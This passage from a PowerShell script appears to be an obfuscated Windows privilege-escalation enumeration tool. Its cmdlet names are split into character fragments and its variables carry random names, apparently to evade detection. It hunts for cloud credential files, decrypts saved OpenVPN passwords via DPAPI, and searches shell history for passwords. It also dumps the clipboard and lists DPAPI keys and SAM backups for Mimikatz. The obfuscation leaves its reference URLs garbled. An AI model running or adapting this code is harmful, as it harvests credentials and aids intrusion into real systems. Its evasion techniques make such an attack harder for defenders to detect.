if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| WHOAMI INFO"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Check Token access here: https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')-&('a' + 'b' + 'u' + 's' + 'i' + 'n' + 'g' + '-' + 't' + 'o' + 'k' + 'e' + 'n' + 's').html#&('a' + 'b' + 'u' + 's' + 'i' + 'n' + 'g' + '-' + 't' + 'o' + 'k' + 'e' + 'n' + 's')"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Check if you are inside the Administrators group or if you have enabled any token that can be use to escalate privileges like SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/index.html#users--groups" -ForegroundColor Yellow
&('S' + 't' + 'a' + 'r' + 't' + '-' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's') whoami.exe -ArgumentList "/all" -Wait -NoNewWindow


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Cloud Credentials Check"
$WtfJReKjLkOmstVSnlmHvBuSqMBbyiGkREUnLZCBkqmESrEZxiYoxxvIxIMvHUuzzRGDIBUuSeWOwcVhRCWYeixmeSIvImdPLLXN = (&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') C:\Users).Name
$JhuWtLUmynoBYIwpKvHRHLhdGojiBXUEVzvWTTasKUscADwCHPZCOVjQVVNKytANydsIWMjNZbRPWapiufrqbyIETnXDJCPVGOlJ = @(".aws\credentials",
  "AppData\Roaming\gcloud\credentials.db",
  "AppData\Roaming\gcloud\legacy_credentials",
  "AppData\Roaming\gcloud\access_tokens.db",
  ".azure\accessTokens.json",
  ".azure\azureProfile.json") 
foreach ($KMfQLNaztrhGdVSSTiqPjRVZlLFNpqZTrRikcTuNNHzOfEHtryyLYkiFJNSEQDaclYZdePTnVNDunlmwyxaAFBPjTaAIroJcMCio in $WtfJReKjLkOmstVSnlmHvBuSqMBbyiGkREUnLZCBkqmESrEZxiYoxxvIxIMvHUuzzRGDIBUuSeWOwcVhRCWYeixmeSIvImdPLLXN) {
  $JhuWtLUmynoBYIwpKvHRHLhdGojiBXUEVzvWTTasKUscADwCHPZCOVjQVVNKytANydsIWMjNZbRPWapiufrqbyIETnXDJCPVGOlJ | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
    if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "c:\Users\$KMfQLNaztrhGdVSSTiqPjRVZlLFNpqZTrRikcTuNNHzOfEHtryyLYkiFJNSEQDaclYZdePTnVNDunlmwyxaAFBPjTaAIroJcMCio\$_") { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$_ found!" -ForegroundColor Red }
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| APPcmd Check"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') ("$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:SystemRoot\System32\inetsrv\appcmd.exe")) {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/index.html#appcmdexe" -ForegroundColor Yellow
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:SystemRoot\System32\inetsrv\appcmd.exe exists!" -ForegroundColor Red
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| OpenVPN Credentials Check"

$NRORbqwJEAVZazISBsYYQIgjNeqJgcqUFJubkGDjPzgcgVARSDIEakhuTGIyDBGUkuYlPoxoOhAOxVgXyLFmdXWQfljKAquVnlQs = &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') "HKCU:\Software\&('O' + 'p' + 'e' + 'n' + 'V' + 'P' + 'N' + '-' + 'G' + 'U' + 'I')\configs" -ErrorAction SilentlyContinue
if ($NRORbqwJEAVZazISBsYYQIgjNeqJgcqUFJubkGDjPzgcgVARSDIEakhuTGIyDBGUkuYlPoxoOhAOxVgXyLFmdXWQfljKAquVnlQs) {
  &('A' + 'd' + 'd' + '-' + 'T' + 'y' + 'p' + 'e') -AssemblyName System.Security
  $NmyKuZUqJzutVmViVRIgcEvENxcRqtSodKTmsrUIHKUmElfSOAdgfWNNpLrQiErfknenmEgKtFKeRgdLMSONJgirdzHqzxooBNgH = $NRORbqwJEAVZazISBsYYQIgjNeqJgcqUFJubkGDjPzgcgVARSDIEakhuTGIyDBGUkuYlPoxoOhAOxVgXyLFmdXWQfljKAquVnlQs | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { &('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') $_.PsPath }
  foreach ($KrvkFcwawtyaQmvrigZmkouutfERVPkgEmDnHKnmdwxmpEasMTLlNjPiLLWeyOVulniNIaLyEzIvBsGFBfmShUeyOdOjhkvWAMrH in $NmyKuZUqJzutVmViVRIgcEvENxcRqtSodKTmsrUIHKUmElfSOAdgfWNNpLrQiErfknenmEgKtFKeRgdLMSONJgirdzHqzxooBNgH) {
    $cNnlimTGBehHDPFMlwimbHSJVJJlqxIMHSQqwjuWFgdtafDHcnZHFBOZBFQacolpiXckUGCQAwfXRDUgjuzrCorZuASkhYJEKdds = $KrvkFcwawtyaQmvrigZmkouutfERVPkgEmDnHKnmdwxmpEasMTLlNjPiLLWeyOVulniNIaLyEzIvBsGFBfmShUeyOdOjhkvWAMrH.'&('a' + 'u' + 't' + 'h' + '-' + 'd' + 'a' + 't' + 'a')'
    $kTGMNTnGEtzyXDlckDEcuEvySHtOqKrkVISRMfehXqrnQlahTTiXBXlNyibHloWLqSsvUIzouVNSJZWMpOTjDyEnHrJVxapJrNsB = $KrvkFcwawtyaQmvrigZmkouutfERVPkgEmDnHKnmdwxmpEasMTLlNjPiLLWeyOVulniNIaLyEzIvBsGFBfmShUeyOdOjhkvWAMrH.'entropy'
    $kTGMNTnGEtzyXDlckDEcuEvySHtOqKrkVISRMfehXqrnQlahTTiXBXlNyibHloWLqSsvUIzouVNSJZWMpOTjDyEnHrJVxapJrNsB = $kTGMNTnGEtzyXDlckDEcuEvySHtOqKrkVISRMfehXqrnQlahTTiXBXlNyibHloWLqSsvUIzouVNSJZWMpOTjDyEnHrJVxapJrNsB[0..(($kTGMNTnGEtzyXDlckDEcuEvySHtOqKrkVISRMfehXqrnQlahTTiXBXlNyibHloWLqSsvUIzouVNSJZWMpOTjDyEnHrJVxapJrNsB.Length) - 2)]

    $SmmbOshLwgiklIgUMXZSuJcGOLQgbVknvlyswJlmxTzMQIoIScSYDPnMRhugduHRReYKawXYvJTRxIkXYARoxoBWotIFFefjrauD = [System.Security.Cryptography.ProtectedData]::Unprotect(
      $cNnlimTGBehHDPFMlwimbHSJVJJlqxIMHSQqwjuWFgdtafDHcnZHFBOZBFQacolpiXckUGCQAwfXRDUgjuzrCorZuASkhYJEKdds, 
      $kTGMNTnGEtzyXDlckDEcuEvySHtOqKrkVISRMfehXqrnQlahTTiXBXlNyibHloWLqSsvUIzouVNSJZWMpOTjDyEnHrJVxapJrNsB, 
      [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ([System.Text.Encoding]::Unicode.GetString($SmmbOshLwgiklIgUMXZSuJcGOLQgbVknvlyswJlmxTzMQIoIScSYDPnMRhugduHRReYKawXYvJTRxIkXYARoxoBWotIFFefjrauD))
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| PowerShell History (Password Search Only)"

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "=|| PowerShell Console History"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "=|| To see all history, run this command: &('G' + 'e' + 't' + '-' + 'C' + 'o' + 'n' + 't' + 'e' + 'n' + 't') (&('G' + 'e' + 't' + '-' + 'P' + 'S' + 'R' + 'e' + 'a' + 'd' + 'l' + 'i' + 'n' + 'e' + 'O' + 'p' + 't' + 'i' + 'o' + 'n')).HistorySavePath"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $(&('G' + 'e' + 't' + '-' + 'C' + 'o' + 'n' + 't' + 'e' + 'n' + 't') (&('G' + 'e' + 't' + '-' + 'P' + 'S' + 'R' + 'e' + 'a' + 'd' + 'L' + 'i' + 'n' + 'e' + 'O' + 'p' + 't' + 'i' + 'o' + 'n')).HistorySavePath | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') pa)

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "=|| AppData PSReadline Console History "
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "=|| To see all history, run this command: &('G' + 'e' + 't' + '-' + 'C' + 'o' + 'n' + 't' + 'e' + 'n' + 't') $XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $(&('G' + 'e' + 't' + '-' + 'C' + 'o' + 'n' + 't' + 'e' + 'n' + 't') "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') pa)


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "=|| PowerShell default transcript history check "
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') $XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:SystemDrive\transcripts\) { "Default transcripts found at $($XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:SystemDrive)\transcripts\" }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| ENVIRONMENT VARIABLES "
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Maybe you can take advantage of modifying/creating a binary in some of the following locations"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "PATH variable entries permissions - place binary or DLL to execute instead of legitimate"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/index.html#&('d' + 'l' + 'l' + '-' + 'h' + 'i' + 'j' + 'a' + 'c' + 'k' + 'i' + 'n' + 'g')" -ForegroundColor Yellow

&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') env: | &('F' + 'o' + 'r' + 'm' + 'a' + 't' + '-' + 'T' + 'a' + 'b' + 'l' + 'e') -Wrap


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Sticky Notes Check"
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "C:\Users\$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:USERNAME\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite") {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Sticky Notes database found. Could have credentials in plain text: "
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "C:\Users\$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:USERNAME\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite"
}

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Cached Credentials Check"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/index.html#&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'v' + 'a' + 'u' + 'l' + 't')" -ForegroundColor Yellow 
cmdkey.exe /list


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking for DPAPI RPC Master Keys"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/index.html#dpapi" -ForegroundColor Yellow

$bEzYGrNLgebPeUKnvfolQcvMoipRIlxMYausLKnDmXdJmNDDhkRMiRmrpQSiMghRRJMixmyRXFufZxmSZIDeSHxJBEDTHzYhoJIE = "C:\Users\$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:USERNAME\AppData\Roaming\Microsoft\"
$XKnaRTUPbyStjvyMOwfJSSZugBwKKFSXPcyGUOiixbxEkOmMARLEZxQUZGsdGtywzyaViWfgLhWVHMRUxzSFxXcdMKrUBYakoHML = "C:\Users\$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:USERNAME\AppData\Local\Microsoft\"
if ( &('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "$bEzYGrNLgebPeUKnvfolQcvMoipRIlxMYausLKnDmXdJmNDDhkRMiRmrpQSiMghRRJMixmyRXFufZxmSZIDeSHxJBEDTHzYhoJIE\Protect\") {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "found: $bEzYGrNLgebPeUKnvfolQcvMoipRIlxMYausLKnDmXdJmNDDhkRMiRmrpQSiMghRRJMixmyRXFufZxmSZIDeSHxJBEDTHzYhoJIE\Protect\"
  &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') -Path "$bEzYGrNLgebPeUKnvfolQcvMoipRIlxMYausLKnDmXdJmNDDhkRMiRmrpQSiMghRRJMixmyRXFufZxmSZIDeSHxJBEDTHzYhoJIE\Protect\" -Force | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $_.FullName
  }
}
if ( &('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "$XKnaRTUPbyStjvyMOwfJSSZugBwKKFSXPcyGUOiixbxEkOmMARLEZxQUZGsdGtywzyaViWfgLhWVHMRUxzSFxXcdMKrUBYakoHML\Protect\") {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "found: $XKnaRTUPbyStjvyMOwfJSSZugBwKKFSXPcyGUOiixbxEkOmMARLEZxQUZGsdGtywzyaViWfgLhWVHMRUxzSFxXcdMKrUBYakoHML\Protect\"
  &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') -Path "$XKnaRTUPbyStjvyMOwfJSSZugBwKKFSXPcyGUOiixbxEkOmMARLEZxQUZGsdGtywzyaViWfgLhWVHMRUxzSFxXcdMKrUBYakoHML\Protect\" -Force | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $_.FullName
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking for DPAPI Cred Master Keys"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt" 
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module" 
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "https://book.hacktricks.wiki/en/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'h' + 'a' + 'r' + 'd' + 'e' + 'n' + 'i' + 'n' + 'g')/&('w' + 'i' + 'n' + 'd' + 'o' + 'w' + 's' + '-' + 'l' + 'o' + 'c' + 'a' + 'l')-&('p' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + '-' + 'e' + 's' + 'c' + 'a' + 'l' + 'a' + 't' + 'i' + 'o' + 'n')/index.html#dpapi" -ForegroundColor Yellow

if ( &('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "$bEzYGrNLgebPeUKnvfolQcvMoipRIlxMYausLKnDmXdJmNDDhkRMiRmrpQSiMghRRJMixmyRXFufZxmSZIDeSHxJBEDTHzYhoJIE\Credentials\") {
  &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') -Path "$bEzYGrNLgebPeUKnvfolQcvMoipRIlxMYausLKnDmXdJmNDDhkRMiRmrpQSiMghRRJMixmyRXFufZxmSZIDeSHxJBEDTHzYhoJIE\Credentials\" -Force
}
if ( &('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "$XKnaRTUPbyStjvyMOwfJSSZugBwKKFSXPcyGUOiixbxEkOmMARLEZxQUZGsdGtywzyaViWfgLhWVHMRUxzSFxXcdMKrUBYakoHML\Credentials\") {
  &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') -Path "$XKnaRTUPbyStjvyMOwfJSSZugBwKKFSXPcyGUOiixbxEkOmMARLEZxQUZGsdGtywzyaViWfgLhWVHMRUxzSFxXcdMKrUBYakoHML\Credentials\" -Force
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Current Logged on Users"
try { quser }catch { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "'quser' command not not present on system" } 


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Remote Sessions"
try { qwinsta } catch { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "'qwinsta' command not present on system" }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Kerberos tickets (does require admin to interact)"
try { klist } catch { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "No active sessions" }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Printing ClipBoard (if any)"
&('G' + 'e' + 't' + '-' + 'C' + 'l' + 'i' + 'p' + 'B' + 'o' + 'a' + 'r' + 'd' + 'T' + 'e' + 'x' + 't')

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Unattended Files Check"
@("C:\Windows\sysprep\sysprep.xml",
  "C:\Windows\sysprep\sysprep.inf",
  "C:\Windows\sysprep.inf",
  "C:\Windows\Panther\Unattended.xml",
  "C:\Windows\Panther\Unattend.xml",
  "C:\Windows\Panther\Unattend\Unattend.xml",
  "C:\Windows\Panther\Unattend\Unattended.xml",
  "C:\Windows\System32\Sysprep\unattend.xml",
  "C:\Windows\System32\Sysprep\unattended.xml",
  "C:\unattend.txt",
  "C:\unattend.inf") | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') $_) {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$_ found."
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| SAM / SYSTEM Backup Checks"

@(
  "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:windir\repair\SAM",
  "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:windir\System32\config\RegBack\SAM",
  "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:windir\System32\config\SAM",
  "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:windir\repair\system",
  "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:windir\System32\config\SYSTEM",
  "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:windir\System32\config\RegBack\system") | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') $_ -ErrorAction SilentlyContinue) {
